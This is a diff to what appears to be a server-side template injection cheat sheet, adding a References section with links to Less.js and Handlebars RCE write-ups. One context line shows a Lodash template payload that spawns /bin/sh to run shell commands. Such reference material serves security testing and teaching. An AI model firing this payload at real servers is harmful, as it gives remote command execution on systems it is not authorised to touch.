@@ -8,7 +8,7 @@
 - [Lodash](#Lodash)
     - [Lodash - Basic Injection](#lodash---basic-injection)
     - [Lodash - Command Execution](#lodash---command-execution)
-
+- [References](#references)
 
 ## Templating Libraries
 
@@ -104,5 +104,8 @@ ${= _.VERSION}
 {{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
 ```
 
----
 
+## References
+
+- [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
+- [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
